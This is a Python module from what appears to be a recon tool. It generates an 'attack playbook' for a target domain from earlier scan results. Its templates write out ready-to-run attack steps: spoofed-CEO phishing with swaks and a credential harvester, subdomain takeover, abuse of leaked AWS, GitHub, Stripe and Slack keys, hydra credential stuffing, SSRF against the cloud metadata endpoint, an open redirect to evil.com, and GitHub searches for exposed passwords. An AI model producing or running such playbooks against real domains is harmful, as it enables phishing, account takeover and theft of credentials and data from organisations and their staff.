from __future__ import annotations

import time
import asyncio
from typing import AsyncIterator, Callable

from rich.markup import escape

from .base import Finding, ReconModule, _normalize
from .brief import _WAIT_FOR, _WAIT_TIMEOUT, _SPINNER, _parse_int


class PlaybookModule(ReconModule):
    name = "Playbook"
    panel_id = "playbook"

    def __init__(
        self,
        config: dict[str, str],
        get_panel_data: Callable[[], dict[str, dict]],
    ) -> None:
        super().__init__(config)
        self._get_panel_data = get_panel_data

    async def run(self, target: str) -> AsyncIterator[Finding]:
        domain = _normalize(target)
        deadline = time.monotonic() + _WAIT_TIMEOUT
        spin_idx = 0

        while time.monotonic() < deadline:
            data = self._get_panel_data()
            still_running = [
                pid for pid in _WAIT_FOR
                if data.get(pid, {}).get("status", "idle") in ("running", "idle")
            ]
            if not still_running:
                break
            remaining = int(deadline - time.monotonic())
            spin = _SPINNER[spin_idx % len(_SPINNER)]
            yield Finding(
                "playbook",
                f"[dim]{spin} Building playbook... ({remaining}s)[/dim]",
                progress=True,
            )
            spin_idx += 1
            await asyncio.sleep(3)

        data = self._get_panel_data()
        for finding in _build_playbook(domain, data):
            yield finding


# ── Playbook builder ──────────────────────────────────────────────────────────

def _build_playbook(domain: str, data: dict[str, dict]) -> list[Finding]:
    steps: list[dict] = []

    # Gather intel from panels
    spoof_lines    = data.get("spoof",     {}).get("findings", [])
    takeover_lines = data.get("takeover",  {}).get("findings", [])
    breach_lines   = data.get("breach",    {}).get("findings", [])
    github_lines   = data.get("github",    {}).get("findings", [])
    js_lines       = data.get("jsscan",    {}).get("findings", [])
    param_lines    = data.get("params",    {}).get("findings", [])
    hunter_lines   = data.get("hunter",   {}).get("findings", [])
    dns_lines      = data.get("dns",       {}).get("findings", [])
    urlscan_lines  = data.get("urlscan",   {}).get("findings", [])
    emp_lines      = data.get("employees", {}).get("findings", [])

    spoofable     = any("SPOOFABLE" in l for l in spoof_lines)
    vuln_takeovers = [l for l in takeover_lines if "VULN" in l]
    js_secrets    = [l for l in js_lines if "FOUND" in l]
    breach_found  = any("breach" in l.lower() and "found" in l.lower() and "No breach" not in l
                        for l in breach_lines)

    # ── Email pattern
    pattern_line  = next((l for l in hunter_lines if "pattern" in l.lower()), None)
    email_count_l = next((l for l in hunter_lines if "Emails found" in l), None)
    email_count   = _parse_int(email_count_l) if email_count_l else 0
    email_pattern = ""
    if pattern_line:
        parts = pattern_line.strip().split()
        email_pattern = parts[-1] if parts else ""

    # ── MX server
    mx_line = next((l for l in dns_lines if l.strip().startswith("MX")), None)
    mx_server = ""
    if mx_line:
        parts = mx_line.strip().split()
        mx_server = parts[-1].rstrip(".") if len(parts) >= 3 else ""

    # ── Top employee target
    top_target = ""
    top_role   = ""
    if emp_lines:
        for i, l in enumerate(emp_lines):
            if "@" in l and "confidence" in l.lower():
                top_target = l.split()[0].strip()
                if i > 0:
                    top_role = emp_lines[i - 1].strip()
                break

    # ── Login pages from params/urlscan
    login_paths = [
        l.strip() for l in param_lines
        if any(p in l.lower() for p in ("/login", "/signin", "/wp-admin", "/admin", "/auth"))
        and not l.strip().startswith("Admin")
    ]
    login_url = f"https://{domain}/login"
    if login_paths:
        login_url = f"https://{domain}{login_paths[0]}"

    # ── Step 1: Phishing (if spoofable + emails)
    if spoofable and email_count >= 1:
        to_addr = top_target or f"target@{domain}"
        subject = "Urgent: Account verification required"
        cmd_from = f"ceo@{domain}"
        step = {
            "title": "PHISHING CAMPAIGN",
            "severity": "CRITICAL",
            "color": "red",
            "basis": f"Domain spoofable (DMARC not enforced) + {email_count} emails discovered",
            "steps": [
                f"1. Craft spoofed email as executive:",
                f'   swaks --from {cmd_from} --to {to_addr} \\',
                f'         --server {mx_server or "mx." + domain} \\',
                f'         --header "Subject: {subject}"',
                f"",
                f"2. Host credential harvester clone of {domain}",
                f"3. Link in email body -> harvest credentials",
            ],
        }
        if top_role:
            step["steps"].insert(0, f"Priority target: {top_target} ({top_role})")
        steps.append(step)

    # ── Step 2: Subdomain takeover
    if vuln_takeovers:
        for vt in vuln_takeovers[:2]:
            clean = vt.strip()
            steps.append({
                "title": "SUBDOMAIN TAKEOVER",
                "severity": "CRITICAL",
                "color": "red",
                "basis": clean,
                "steps": [
                    "1. Identify the dangling service (GitHub Pages / S3 / Netlify)",
                    "2. Register/claim the resource at the CNAME target",
                    "3. Host malicious page or credential harvester",
                    "4. Traffic to the subdomain now lands on your page",
                    "",
                    "Bonus: if MX record — intercept inbound email",
                ],
            })

    # ── Step 3: JS secret exploitation
    for secret_line in js_secrets[:2]:
        secret_type = "API credential"
        cmd = ""
        sl = secret_line.lower()
        if "aws" in sl:
            secret_type = "AWS Access Key"
            cmd = "aws sts get-caller-identity\naws s3 ls\naws iam list-users"
        elif "github" in sl:
            secret_type = "GitHub Token"
            cmd = 'curl -H "Authorization: token TOKEN" https://api.github.com/user\ncurl ... /repos  (list private repos)'
        elif "stripe" in sl:
            secret_type = "Stripe Live Key"
            cmd = "curl https://api.stripe.com/v1/customers -u sk_live_KEY:"
        elif "jwt" in sl:
            secret_type = "JWT Token"
            cmd = "Decode at jwt.io — check alg:none / weak secret\nAttempt privilege escalation via modified claims"
        elif "slack" in sl:
            secret_type = "Slack Token"
            cmd = "curl -H 'Authorization: Bearer TOKEN' https://slack.com/api/users.list"

        steps.append({
            "title": f"EXPLOIT {secret_type.upper()}",
            "severity": "CRITICAL",
            "color": "red",
            "basis": secret_line.strip(),
            "steps": [cmd] if cmd else ["Extract credential and test against service API"],
        })

    # ── Step 4: Credential stuffing (if breach found)
    if breach_found:
        breach_name = next(
            (l.strip() for l in breach_lines
             if l.strip() and not l.startswith(" ")
             and "breach" not in l.lower() and "found" not in l.lower()),
            "discovered breach"
        )
        steps.append({
            "title": "CREDENTIAL STUFFING",
            "severity": "HIGH",
            "color": "yellow",
            "basis": f"Domain found in: {breach_name}",
            "steps": [
                f"1. Obtain combo list from breach dump",
                f"2. Filter to @{domain} addresses",
                f"3. Spray against login portal:",
                f"   hydra -L emails.txt -P passwords.txt \\",
                f'         -s 443 {domain} https-post-form \\',
                f'         "/login:username=^USER^&password=^PASS^:Invalid"',
                f"",
                f"4. Also try VPN/OWA/SSO portals (found via URLScan)",
            ],
        })

    # ── Step 5: SSRF / param injection
    ssrf_params = [
        l.strip() for l in param_lines
        if "=" in l and any(p in l for p in ("url=", "redirect=", "return=", "host=", "src="))
    ]
    if ssrf_params:
        steps.append({
            "title": "SSRF / OPEN REDIRECT",
            "severity": "HIGH",
            "color": "yellow",
            "basis": f"{len(ssrf_params)} redirect/SSRF param(s) in archived URLs",
            "steps": [
                f"Candidates: {', '.join(p.split()[0] for p in ssrf_params[:4])}",
                f"",
                f"Test SSRF:",
                f"  curl 'https://{domain}/page?url=http://169.254.169.254/latest/meta-data/'",
                f"  (AWS metadata endpoint — reveals IAM credentials if hosted on EC2)",
                f"",
                f"Test open redirect:",
                f"  https://{domain}/login?return=https://evil.com",
                f"  (Use for phishing — trusted domain in URL bar)",
            ],
        })

    # ── Step 6: GitHub secret hunt
    if data.get("github", {}).get("count", 0) > 5:
        steps.append({
            "title": "GITHUB SECRET HUNT",
            "severity": "HIGH",
            "color": "yellow",
            "basis": f"{data['github']['count']} GitHub code results",
            "steps": [
                f'gh search code "password {domain}" --limit 30',
                f'gh search code "api_key {domain}" --limit 30',
                f'gh search code "secret {domain}" --limit 30',
                f"",
                f"Look for: .env files, config files, CI/CD secrets,",
                f"          hardcoded DB passwords, AWS/GCP credentials",
            ],
        })

    # ── Assemble output
    out: list[Finding] = []

    if not steps:
        out.append(Finding("playbook", "[green]No high-priority attack vectors identified[/green]"))
        return out

    out.append(Finding("playbook", f"[bold]ATTACK PLAYBOOK[/bold]  [dim]{domain}[/dim]"))
    out.append(Finding("playbook", f"[dim]{len(steps)} attack vector(s) — ordered by priority[/dim]"))

    for i, step in enumerate(steps, 1):
        color = step["color"]
        out.append(Finding("playbook", ""))
        out.append(Finding(
            "playbook",
            f"[bold {color}]STEP {i}  {step['title']}[/bold {color}]"
            f"  [{color}]{step['severity']}[/{color}]",
        ))
        out.append(Finding("playbook", f"[dim]Basis: {escape(step['basis'][:120])}[/dim]"))
        out.append(Finding("playbook", ""))
        for line in step["steps"]:
            if line.startswith(("aws ", "curl ", "hydra ", "swaks ", "gh ", "jwt")):
                out.append(Finding("playbook", f"  [bold cyan]{escape(line)}[/bold cyan]"))
            elif line == "":
                out.append(Finding("playbook", ""))
            else:
                out.append(Finding("playbook", f"  [dim]{escape(line)}[/dim]"))

    return out
